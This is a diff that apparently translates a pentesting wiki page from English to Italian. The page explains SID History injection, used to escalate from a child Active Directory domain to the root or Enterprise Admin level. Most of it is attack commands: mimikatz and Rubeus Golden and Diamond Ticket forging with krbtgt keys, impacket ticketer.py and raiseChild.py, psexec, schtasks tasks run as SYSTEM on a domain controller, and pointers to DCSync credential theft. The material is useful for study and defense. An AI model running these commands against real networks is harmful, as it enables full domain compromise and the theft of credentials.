@@ -2,24 +2,21 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## SID History Injection Attack
+## Attacco di Iniezione della Storia SID
 
-The focus of the **SID History Injection Attack** is aiding **user migration between domains** while ensuring continued access to resources from the former domain. This is accomplished by **incorporating the user's previous Security Identifier (SID) into the SID History** of their new account. Notably, this process can be manipulated to grant unauthorized access by adding the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain to the SID History. This exploitation confers access to all resources within the parent domain.
+L'obiettivo dell'**Attacco di Iniezione della Storia SID** è facilitare **la migrazione degli utenti tra domini** garantendo al contempo l'accesso continuo alle risorse del precedente dominio. Questo viene realizzato **incorporando il precedente Identificatore di Sicurezza (SID) dell'utente nella Storia SID** del loro nuovo account. È importante notare che questo processo può essere manipolato per concedere accesso non autorizzato aggiungendo il SID di un gruppo ad alta privilegio (come Enterprise Admins o Domain Admins) dal dominio principale alla Storia SID. Questa sfruttamento conferisce accesso a tutte le risorse all'interno del dominio principale.
 
-Two methods exist for executing this attack: through the creation of either a **Golden Ticket** or a **Diamond Ticket**.
+Esistono due metodi per eseguire questo attacco: attraverso la creazione di un **Golden Ticket** o di un **Diamond Ticket**.
 
-To pinpoint the SID for the **"Enterprise Admins"** group, one must first locate the SID of the root domain. Following the identification, the Enterprise Admins group SID can be constructed by appending `-519` to the root domain's SID. For instance, if the root domain SID is `S-1-5-21-280534878-1496970234-700767426`, the resulting SID for the "Enterprise Admins" group would be `S-1-5-21-280534878-1496970234-700767426-519`.
+Per individuare il SID per il gruppo **"Enterprise Admins"**, è necessario prima localizzare il SID del dominio radice. Dopo l'identificazione, il SID del gruppo Enterprise Admins può essere costruito aggiungendo `-519` al SID del dominio radice. Ad esempio, se il SID del dominio radice è `S-1-5-21-280534878-1496970234-700767426`, il SID risultante per il gruppo "Enterprise Admins" sarebbe `S-1-5-21-280534878-1496970234-700767426-519`.
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+Puoi anche utilizzare i gruppi **Domain Admins**, che terminano in **512**.
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
-
+Un altro modo per trovare il SID di un gruppo dell'altro dominio (ad esempio "Domain Admins") è con:
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
-
+### Golden Ticket (Mimikatz) con KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -36,15 +33,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-
-For more info about golden tickets check:
+Per ulteriori informazioni sui golden ticket controlla:
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
-
 ```powershell
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
@@ -54,21 +49,17 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 
 # You can use "Administrator" as username or any other string
 ```
-
-For more info about diamond tickets check:
+Per ulteriori informazioni sui diamond tickets controlla:
 
 {{#ref}}
 diamond-ticket.md
 {{#endref}}
-
 ```bash
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
-
+Esegui l'escalation a DA di root o Enterprise admin utilizzando l'hash KRBTGT del dominio compromesso:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -80,17 +71,15 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+Con i permessi acquisiti dall'attacco, puoi eseguire ad esempio un attacco DCSync nel nuovo dominio:
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-### From linux
+### Da linux
 
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
-
+#### Manuale con [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -110,31 +99,27 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-
 #### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+Questo è uno script Impacket che **automatizza l'innalzamento da un dominio child a un dominio parent**. Lo script richiede:
 
-- Target domain controller
-- Creds for an admin user in the child domain
+- Domain controller di destinazione
+- Credenziali per un utente admin nel dominio child
 
-The flow is:
+Il flusso è:
 
-- Obtains the SID for the Enterprise Admins group of the parent domain
-- Retrieves the hash for the KRBTGT account in the child domain
-- Creates a Golden Ticket
-- Logs into the parent domain
-- Retrieves credentials for the Administrator account in the parent domain
-- If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
-
+- Ottiene il SID per il gruppo Enterprise Admins del dominio parent
+- Recupera l'hash per l'account KRBTGT nel dominio child
+- Crea un Golden Ticket
+- Effettua il login nel dominio parent
+- Recupera le credenziali per l'account Administrator nel dominio parent
+- Se l'opzione `target-exec` è specificata, si autentica al Domain Controller del dominio parent tramite Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-
-## References
+## Riferimenti
 
 - [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
 - [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
